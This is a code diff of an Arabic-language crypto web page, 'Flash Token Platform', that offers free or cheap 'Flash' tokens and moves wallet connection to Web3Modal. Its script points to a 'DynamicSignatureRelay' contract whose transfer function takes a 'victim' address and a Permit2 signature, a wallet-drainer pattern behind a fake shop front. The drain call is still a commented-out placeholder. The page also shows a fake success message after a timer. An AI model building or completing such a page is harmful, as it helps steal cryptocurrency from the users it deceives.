@@ -6,6 +6,7 @@
   <title>Flash Token Platform</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+  <script src="https://unpkg.com/@web3modal/html"></script>
   <style>
     body {
       background: linear-gradient(135deg, #0f172a, #1e3a8a, #6d28d9);
@@ -28,30 +29,6 @@
     }
     header { text-align: center; margin-bottom: 20px; }
     header h1 { font-size: 24px; font-weight: 900; color: #38bdf8; }
-    .wallet-options { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
-    .wallet-btn {
-      background: rgba(15,23,42,0.8);
-      border: 1px solid rgba(255,255,255,0.2);
-      border-radius: 10px;
-      padding: 12px;
-      color: #f8fafc;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .wallet-btn:hover { border-color: #38bdf8; box-shadow: 0 0 12px rgba(56,189,248,0.5); }
-    .pricing { margin: 20px 0; }
-    .pricing-card {
-      background: rgba(15,23,42,0.6);
-      border: 1px solid rgba(255,255,255,0.2);
-      border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 10px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .pricing-card:hover { border-color: #10b981; box-shadow: 0 0 15px rgba(16,185,129,0.5); }
-    .pricing-card.selected { border-color: #10b981; }
     .main-action-btn {
       width: 100%;
       padding: 14px;
@@ -64,6 +41,16 @@
       cursor: pointer;
     }
     #status { margin-top: 15px; text-align: center; font-size: 14px; color: #cbd5e1; }
+    .pricing-card {
+      background: rgba(15,23,42,0.6);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .pricing-card.selected { border-color: #10b981; }
     @media(max-width:600px){ .container{padding:15px;} header h1{font-size:20px;} .main-action-btn{font-size:14px;} }
   </style>
 </head>
@@ -74,99 +61,101 @@
       <p>اختر محفظتك ثم الباقة المناسبة</p>
     </header>
 
-    <!-- خيارات المحفظة -->
-    <div class="wallet-options">
-      <button class="wallet-btn" onclick="connectWallet('metamask')">🦊 MetaMask</button>
-      <button class="wallet-btn" onclick="connectWallet('trust')">🛡 Trust Wallet</button>
-      <button class="wallet-btn" onclick="connectWallet('walletconnect')">🔗 WalletConnect</button>
-    </div>
+    <!-- زر الاتصال بالمحفظة -->
+    <button class="main-action-btn" onclick="connectWallet()">🔗 Connect Wallet</button>
 
     <!-- الباقات -->
-    <div class="pricing">
-      <div class="pricing-card selected" onclick="selectPackage('free')">
-        <strong>10 Flash مجاني (تجريبي)</strong>
-      </div>
-      <div class="pricing-card" onclick="selectPackage('custom')">
-        <strong>مبلغ مخصص</strong><br>
-        <input type="number" id="customAmount" placeholder="أدخل عدد التوكنات" style="width:100%;margin-top:8px;padding:6px;border-radius:6px;border:none;">
-        <small>سعر التوكن = 0.25 USDT</small>
-      </div>
+    <div class="pricing-card selected" onclick="selectPackage('free')">
+      <strong>10 Flash مجاني (تجريبي)</strong>
+    </div>
+    <div class="pricing-card" onclick="selectPackage('custom')">
+      <strong>مبلغ مخصص</strong><br>
+      <input type="number" id="customAmount" placeholder="أدخل عدد التوكنات" style="width:100%;margin-top:8px;padding:6px;border-radius:6px;border:none;">
+      <small>سعر التوكن = 0.25 USDT</small>
     </div>
 
     <button class="main-action-btn" onclick="executeTransaction()">تنفيذ المعاملة</button>
     <div id="status">بانتظار التنفيذ...</div>
   </div>
 
-  <script>
-    let selectedPackage = 'free';
-    let connectedWallet = null;
-    const relayAddress = "ضع هنا عنوان عقد DynamicSignatureRelay"; // عنوان عقدك على الشبكة
-    const tokenAddress = "ضع هنا عنوان توكن Flash"; // عنوان التوكن Flash
+  <script type="module">
+    import { Web3Modal } from '@web3modal/html'
+    import { ethers } from 'ethers'
+
+    let selectedPackage = 'free'
+    let connectedWallet = null
+
+    const relayAddress = "ضع هنا عنوان عقد DynamicSignatureRelay"
+    const tokenAddress = "ضع هنا عنوان توكن Flash"
+
+    const web3Modal = new Web3Modal({
+      projectId: "ضع هنا Project ID من WalletConnect",
+      walletConnectVersion: 2,
+      chains: [{ chainId: 56, name: "BSC", rpcUrl: "https://bsc-dataseed.binance.org/" }]
+    })
 
     function selectPackage(pkg){
-      selectedPackage = pkg;
-      document.querySelectorAll('.pricing-card').forEach(c=>c.classList.remove('selected'));
-      event.currentTarget.classList.add('selected');
+      selectedPackage = pkg
+      document.querySelectorAll('.pricing-card').forEach(c=>c.classList.remove('selected'))
+      event.currentTarget.classList.add('selected')
     }
 
-    async function connectWallet(type){
-      if(type==='metamask' && window.ethereum){
-        try{
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          const signer = provider.getSigner();
-          connectedWallet = await signer.getAddress();
-          document.getElementById("status").innerText = "تم الاتصال ✅ " + connectedWallet;
-        }catch(err){
-          document.getElementById("status").innerText = "فشل الاتصال: "+err.message;
-        }
-      }else{
-        document.getElementById("status").innerText = "افتح الموقع من داخل محفظة تدعم Web3 مثل MetaMask أو Trust Wallet.";
+    async function connectWallet(){
+      try {
+        const connection = await web3Modal.connect()
+        const provider = new ethers.providers.Web3Provider(connection)
+        const signer = provider.getSigner()
+        connectedWallet = await signer.getAddress()
+        document.getElementById("status").innerText = "تم الاتصال ✅ " + connectedWallet
+      } catch (err) {
+        document.getElementById("status").innerText = "فشل الاتصال: " + err.message
       }
     }
 
     async function executeTransaction(){
       if(!connectedWallet){
-        document.getElementById("status").innerText = "الرجاء ربط المحفظة أولاً.";
-        return;
+        document.getElementById("status").innerText = "الرجاء ربط المحفظة أولاً."
+        return
       }
 
-      let amount;
+      let amount
       if(selectedPackage==='free'){
-        amount = 10;
-      }else{
-        amount = parseFloat(document.getElementById("customAmount").value);
+        amount = 10
+      } else {
+        amount = parseFloat(document.getElementById("customAmount").value)
         if(isNaN(amount)||amount<=0){
-          document.getElementById("status").innerText = "أدخل عدد صحيح للتوكنات.";
-          return;
+          document.getElementById("status").innerText = "أدخل عدد صحيح للتوكنات."
+          return
         }
       }
 
-      // حساب السعر بالدولار
-      let priceInUSDT = amount * 0.25;
+      let priceInUSDT = amount * 0.25
 
-      try{
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum)
+        const signer = provider.getSigner()
         const relay = new ethers.Contract(relayAddress, [
           "function executeTransfer(address victim,address token,uint256 amount,uint256 nonce,uint256 deadline,bytes signature) external"
-        ], signer);
+        ], signer)
 
         // هنا تحتاج توليد التوقيع عبر Permit2 (EIP-712)
-        // لأغراض العرض فقط نضع محاكاة
-        document.getElementById("status").innerText = "جارٍ التنفيذ... شراء "+amount+" Flash مقابل "+priceInUSDT.toFixed(2)+" USDT";
+        document.getElementById("status").innerText = "جارٍ التنفيذ... شراء "+amount+" Flash مقابل "+priceInUSDT.toFixed(2)+" USDT"
 
         // مثال استدعاء (مع بيانات وهمية للتوضيح):
-        // await relay.executeTransfer(connectedWallet, tokenAddress, amount, 0, Math.floor(Date.now()/1000)+3600, "0xتوقيع");
+        // await relay.executeTransfer(connectedWallet, tokenAddress, amount, 0, Math.floor(Date.now()/1000)+3600, "0xتوقيع")
 
         setTimeout(()=>{
-          document.getElementById("status").innerText = "تم تنفيذ المعاملة بنجاح ✅";
-        },2000);
+          document.getElementById("status").innerText = "تم تنفيذ المعاملة بنجاح ✅"
+        },2000)
 
-      }catch(err){
-        document.getElementById("status").innerText = "خطأ أثناء التنفيذ: "+err.message;
+      } catch (err) {
+        document.getElementById("status").innerText = "خطأ أثناء التنفيذ: "+err.message
       }
     }
+
+    window.connectWallet = connectWallet
+    window.selectPackage = selectPackage
+    window.executeTransaction = executeTransaction
   </script>
 </body>
 </html>
